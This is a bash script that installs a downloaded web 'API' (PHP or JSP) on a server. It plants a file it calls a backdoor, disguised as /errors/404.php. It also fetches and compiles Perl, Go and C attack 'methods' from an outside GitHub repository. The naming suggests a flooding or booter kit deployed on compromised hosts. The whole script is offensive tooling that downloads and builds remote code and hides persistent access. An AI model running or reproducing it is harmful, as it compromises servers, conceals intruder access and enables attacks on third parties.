#!/bin/bash

cnt () {

   outp=$($1 2>&1 );
   if [ "${outp#*$2}" != "$outp" ];
    then 
        return 0;
    else
        return 1;
    fi
}

mkdir api;


WGET_URL=""

echo "API Type > PHP | JSP: "
read FILE_TYPE;

if [ "$FILE_TYPE" = "PHP" ];
then 
    WGET_URL="https://raw.githubusercontent.com/ElusiveSquad/rooted_apis/main/api/api.php";
elif [ "$FILE_TYPE" = "JSP" ]
then 
    WGET_URL="https://raw.githubusercontent.com/ElusiveSquad/rooted_apis/main/tomcat.jsp";
else
    echo "Invalid file type.";
    exit;
fi

echo "Installing API...";

wget $WGET_URL;

if [ "$FILE_TYPE" = "PHP" ]
then 
    mv api.php api 
else
    mv tomcat.jsp api
fi

echo "Installed API";

echo "Installing Backdoor...";

mkdir errors
cd errors && wget https://raw.githubusercontent.com/ElusiveSquad/rooted_apis/main/backdoor/404.php && cd ..;

echo "[+] Installed backdoor ( /errors/404.php )";
cnt "perl -h" "Run 'perldoc perl' for more help with Perl.";

if [ $? -eq 0 ];
then 
    echo "[+] FOUND Perl, installing perl methods."
    mkdir perl
    cd perl && wget -i ../../txt/perl_methods.txt && cd ..;
    echo "Installed perl methods."
else
    echo "Perl not found, moving onto GO";
fi

cnt "go help run" "usage"

if [ $? -eq 0 ];
then 
    echo "[+] FOUND GOLANG, installing GO methods."
    mkdir go
    cd go && wget -i ../../txt/go_methods.txt && cd ..
    echo "Installed go methods. Compiling GO files."


    for gofile in go/* ; do
        go build $gofile
        file=$(echo $gofile | cut -d "." -f 1 | cut -d "/" -f 2)
        mv $file go
        rm go/$file.go
    done

    echo "Compiled GO files.";

else
    echo "GO not found, consider installing go, perl, gcc if you have root.";
fi

mkdir c
cd c;

wget https://raw.githubusercontent.com/ElusiveSquad/rooted_apis/main/tcm/tch.c && gcc tch.c -pthread -o tch && rm tch.c

echo "Backdoor, Methods and API installed."